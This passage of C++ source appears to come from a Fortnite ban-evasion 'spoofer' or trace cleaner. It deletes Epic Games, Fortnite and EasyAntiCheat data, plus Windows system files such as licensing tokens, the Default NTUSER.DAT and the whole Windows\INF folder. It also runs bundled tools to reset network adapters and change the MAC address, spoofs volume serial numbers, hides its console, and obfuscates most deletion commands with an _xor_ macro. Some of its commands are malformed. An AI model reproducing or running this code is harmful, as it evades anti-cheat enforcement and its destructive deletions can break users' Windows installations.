	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\CURRENT");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOCK");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOG.old");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\MANIFEST-000001");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_0");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir\\the-real-index");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Visited Links");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\65f6b08d488442e694b1e23d152d971e\\ClientSettings.Sav");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-FA58D227408B75B949C1ECA1ABE0D4C7\\CrashReportClient.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Demos\\UnsavedReplay-2020.06.08-22.56.55.replay");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\CacheAccess.json");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\2895B436A3CE70D8FCBBA971A99D7782F30E1715");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\2A6A06259337531EA5101E9BD8818AE92450FCE4");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\3FE1F488F87F34DD44870F1C28FEEF2E82324B1E");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\407DEAB1A83565509618D0A762FD07BB4889CA1A");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\611EBF87394DCC5D902B67C542206F029AE225F1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\6AB39DE3E2B3DFA4C3A8B927A27FE3BC4B60578E");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\7F8F7208B7E299A57B1E6963C221C4A896A7A97B");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\8C5C92275C748E36EF9BAF10D96D94275784622F");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\AE2C6A4116D64799B1F8763C784FB0E70F7F0BFF");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\C6B9936C20CBD1BAC3492CDB1C9DE3942D67C703");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\D448A2D69B897D0CA64BC7EAD63C82B135B28C90");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\DFD1FBB2DEE6F543B86519B32AA15BE71656A59E");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\EF2FF9F36D089B164C185B6A2F674F7D4AED1C99");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F005B0C18B5D2B42267BDF297A7FC7C62901554B");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0DCD9B7D82F48C55B49D0880\\F523678DF26F4E1038543E480569523090919F57");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b");

	/*end of new traces*/

	DeleteFileW(L"C:\\Windows\\System32\\spp\\store\\2.0\\data.dat");
	DeleteFileW(L"C:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat");
	DeleteFileW(L"C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat");
	DeleteFileW(L"C:\\Users\\Public\\Libraries\\desktop.ini");
	DeleteFileW(L"C:\\ProgramData\\ntuser.pol");
	DeleteFileW(L"C:\\Users\\Default\\NTUSER.DAT");
	DeleteFileW(L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat");
	DeleteFileW(L"C:\\Windows\\INF\\keyboard.pnf");
	DeleteFileW(L"C:\\Windows\\INF\\netrasa.pnf");
	DeleteFileW(L"C:\\Windows\\INF\\netavpna.pnf");
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-US\\keyboard.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-GB\\keyboard.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en\\keyboard.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-GB\\bthpan.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en\\bthpan.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-US\\bthpan.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-GB\\netvwifimp.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en\\netvwifimp.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-US\\netvwifimp.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-GB\\b57nd60a.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en\\b57nd60a.inf_loc").c_str());
	DeleteFileW(_xor_(L"C:\\Windows\\System32\\DriverStore\\en-US\\b57nd60a.inf_loc").c_str());
	DeleteFileW(L"D:\\Windows\\System32\\spp\\store\\2.0\\data.dat");
	DeleteFileW(L"D:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat");
	DeleteFileW(L"D:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat");
	DeleteFileW(L"D:\\Users\\Public\\Libraries\\desktop.ini");
	DeleteFileW(L"D:\\ProgramData\\ntuser.pol");
	DeleteFileW(L"D:\\Users\\Default\\NTUSER.DAT");
	DeleteFileW(L"D:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat");

	DeleteFileW(L"E:\\Windows\\System32\\spp\\store\\2.0\\data.dat");
	DeleteFileW(L"E:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat");
	DeleteFileW(L"E:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat");
	DeleteFileW(L"E:\\Users\\Public\\Libraries\\desktop.ini");
	DeleteFileW(L"E:\\ProgramData\\ntuser.pol");
	DeleteFileW(L"E:\\Users\\Default\\NTUSER.DAT");
	DeleteFileW(L"E:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat");

	DeleteFileW(L"F:\\Windows\\System32\\spp\\store\\2.0\\data.dat");
	DeleteFileW(L"F:\\Windows\\System32\\spp\\store\\2.0\\tokens.dat");
	DeleteFileW(L"F:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat");
	DeleteFileW(L"F:\\Users\\Public\\Libraries\\desktop.ini");
	DeleteFileW(L"F:\\ProgramData\\ntuser.pol");
	DeleteFileW(L"F:\\Users\\Default\\NTUSER.DAT");
	DeleteFileW(L"F:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive\\AuthStateCache.dat");
	clean_launcher();
	cout << "[+] System clean" << endl;
	cout << " " << endl;

	cout << "[+] Modifying Regedit..." << endl;

	cout << "[+] Modified Regedit" << endl;
	cout << " " << endl;

	cout << "[+] Cleaning Network..." << endl;
	clean_net();

	cout << "[+] Cleaned Network" << endl;
	cout << " " << endl;

	DeleteFileW(L"C:\\Windows\\INF\\network.exe");

	cout << "[Risk option] Do you want to reset adapters?(Y/N): ";
	cin >> answ3r;
	if ((answ3r == 'y') || (answ3r == 'Y')) {
		cout << "[+] Resetting network... " << endl;
		system("%systemdrive%\\Windows\\IME\\adapters.exe");
		cout << "[+] Network adapters have been reset" << endl;
		cout << " " << endl;
		cout << "[+] Getting connection back..." << endl;

		Sleep(10000);

	}
	cout << "" << endl;
	cout << "" << endl;


	cout << "[+] Changing Mac..." << endl;
	system("%systemdrive%\\Windows\\IME\\mac.exe");
	cout << "[+] Changed Mac" << endl;





	cout << "[+] Changing Volume IDS..." << endl;
	SpoofAllSerial();
	cout << "[+] Changed Volume IDS" << endl;
	Sleep(3000);


	CConsole::Clear();

	HideConsole();

	CConsole::Clear();


	system("rd /q /s %systemdrive%\\$Recycle.Bin >nul 2>&1");
	system("rd /q /s d:\\$Recycle.Bin >nul 2>&1");
	system("rd /q /s e:\\$Recycle.Bin >nul 2>&1");
	system("rd /q /s f:\\$Recycle.Bin >nul 2>&1");
	CConsole::Clear();

	DeleteFileW(L"C:\\Windows\\IME\\adapters.exe");
	DeleteFileW(L"C:\\Windows\\INF\\network.exe");
	DeleteFileW(L"C:\\Windows\\INF\\devcon.exe");
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\servicing\\InboxFodMetadataCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\IconCacheToDelete").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache").c_str());

	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Logs").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\USOShared\\Logs").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir / s / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\%username%\\Microsoft\\XboxLive").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\Public\\Documents").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\Prefetch").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\XboxLive\\*.*").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q %systemdrive%\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IEDownloadHistory").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IECompatUaCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\IECompatCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\DNTException").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies\\PrivacIE").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History\\Low").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.OneConnect_8wekyb3d8bbwe\\LocalState").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\LocalCache\\EcsCache0").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\TempState").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache\\v3").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\Intel").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\UnrealEngine").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\UnrealEngineLauncher").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\INTEL").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\ntuser.ini").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\System Volume Information\\IndexerVolumeGuid").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v4.0").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\CLR_v3.0").c_str());
	system(_xor_("rmdir /s /q ""\"\%systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\Windows\\System32\\restore\\MachineGuid.txt").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\ProgramData\\Microsoft\\Windows\\WER").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\Users\\Public\\Libraries").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\MSOCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\ConnectedDevicesPlatform\\L.%username%\\ActivitiesCache.db-wal").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\ProgramData\\USOShared\\Logs\\User").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\ConnectedDevicesPlatform\\CDPGlobalSettings.cdp").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\cache\\qtshadercache").c_str());
	system(_xor_("@del /s /f /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.log2").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\VkCache").c_str());
	system(_xor_("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\AMD\\CN\\NewsFeed").c_str());
